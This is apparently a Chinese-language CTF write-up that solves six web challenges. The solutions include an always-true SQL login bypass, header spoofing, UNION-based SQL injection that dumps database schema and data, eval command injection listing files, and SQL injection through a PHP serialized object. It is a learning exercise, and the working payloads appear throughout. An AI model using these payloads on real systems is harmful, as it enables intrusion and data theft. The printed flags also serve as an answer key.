## 1.basic injetcion
万能密码：
' or 1=1 or ''='
结果：
```
<p>
Name: Luke <br>Data: I made this problem. <br>
Name: Alec<br>Data: Steam boys. <br>
Name: Jalen<br>Data: Pump that iron fool. <br>
Name: Eric<br>Data: I make cars. <br>
Name: Sam<br>Data: Thinks he knows SQL.  <br>
Name: fl4g__giv3r<br>Data: th4t_is_why_you_n33d_to_sanitiz3_inputs <br>
Name: snoutpop<br>Data: jowls <br>
Name: Chunbucket<br>Data: @datboiiii <br>	
```

flag:th4t_is_why_you_n33d_to_sanitiz3_inputs


## 2.DON'T BUMP YOUR HEAD(ER)

Sorry, it seems as if your user agent is not correct

打开提示user agent不对，隐藏代码中可以看到Sup3rS3cr3tAg3nt

将User-Agent改为如下：

User-Agent: Sup3rS3cr3tAg3nt

出现：
Sorry, it seems as if you did not just come from the site, "awesomesauce.com"

Referer不对，将Reffer改为如下

Referer:awesomesauce.com

出现flag


## 3.POST PRACTICE
打开发现要Post内容
隐藏内容提示：
<!-- username: admin | password: 71urlkufpsdnlkadsf -->

将get请求改为post，添加post Body:
username=admin&password=71urlkufpsdnlkadsf

发现没反应，再添加请求头：
Content-Type:application/x-www-form-urlencoded

出现flag

## 4.INJ3CTION TIME
burp sql模糊测试

万能密码:id=0 or 1=1
结果
```
<p>
Name: Saranac<br>Breed: Great Dane<br>Color: Black<br>
Name: Doodle<br>Breed: Poodle<br>Color: Pink<br>
Name: Dexter<br>Breed: Lab<br>Color: White<br>
</p>
```
题目提示用union，试一波：
```
id=id=0 or 1=1 order by 4 #正确
id=id=0 or 1=1 order by 5 #错误,有四列
id=0 union select 1,2,3,4 #回显2,1,3
id=0 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database() #爆表名，w0w_y0u_f0und_m3,webeight
id=0 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='w0w_y0u_f0und_m3'#爆列名,出错,估计过滤了引号
id=0 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=0x7730775f7930755f6630756e645f6d33 #列名：f0und_m3
id=0 union select f0und_m3,2,3,4 from w0w_y0u_f0und_m3 #出现flag

```

### 5.CALCULAT3 M3
打开后，发现计算器，随便输入几个值抓包
发现:post请求

body:
expression=

查看源代码发现存在js脚本：
```
function c(val)
{
document.getElementById("d").value=val;
}
function v(val)
{
document.getElementById("d").value+=val;
}
function e() 
{ 
try 
{ 
  c(eval(document.getElementById("d").value)) 
} 
catch(e) 
{
  c('Error') 
} 
}  
```
关键词eval，存在js命令注入
尝试：
```
expression=1+%2b+2 #返回3
expression=1%2b2 #返回1+2
expression=1+%2b+2; #无结果
expression=;   #返回;
expression=;1
expression=;ls  #列出下面所有文件，flag出现
```


### 6.GRID IT!
注册账号，输入账号密码进去。
发现可以打点，
burp暴力打点，发现没什么用。
发现还可以删点。

所以题目剩下三个容易出现问题的地方：
（1）登录
（2）注册
（3）删除点

由于题目既然可以注册，所以首先测试删除点，抓包发现参数被php反序列化：
```
point=O:5:%22point%22:3:{s:1:%22x%22;s:1:%220%22;s:1:%22y%22;s:1:%226%22;s:2:%22ID%22;s:6:%22777445%22;}
```
利用php序列化后：
```
Class point{
    $x=0;
    $y=6;
    $ID=777445;
}
```
猜测是根据id删除，delete from table_name where id=$ID;
尝试万能密码:
id=77744%20or%201
即
point=O:5:%22point%22:3:{s:1:%22x%22;s:1:%220%22;s:1:%22y%22;s:1:%226%22;s:2:%22ID%22;s:11:%22777445%20or%201%22;}
发现所有点都被删除了。存在sql注入。
写个脚本就可以爆整个库。最后得出flag。
可参考别人写的脚本：
https://github.com/terjanq/Flag-Capture/tree/master/Practice/CTFLearn/GridIt

